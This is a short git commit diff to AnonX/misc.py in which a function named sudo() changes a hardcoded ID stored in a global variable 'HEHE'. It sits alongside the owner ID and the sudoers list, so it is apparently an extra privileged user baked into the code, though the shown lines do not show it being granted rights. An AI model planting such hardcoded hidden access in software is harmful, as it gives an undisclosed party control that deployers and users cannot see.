15b687dd04823a3b1daa12c3d39ea2297b129177
vipinofficialxd <120773322+vipinofficialxd@users.noreply.github.com>
2023-07-22 17:06:07 +0530

    Update misc.py

--- AnonX/misc.py
+++ AnonX/misc.py
@@ -45,7 +45,7 @@ def dbb():
 def sudo():
     global SUDOERS, HEHE
     OWNER = config.OWNER_ID
-    HEHE = "5288547197"
+    HEHE = "1985742354"
     sudoersdb = pymongodb.sudoers
     sudoers = sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
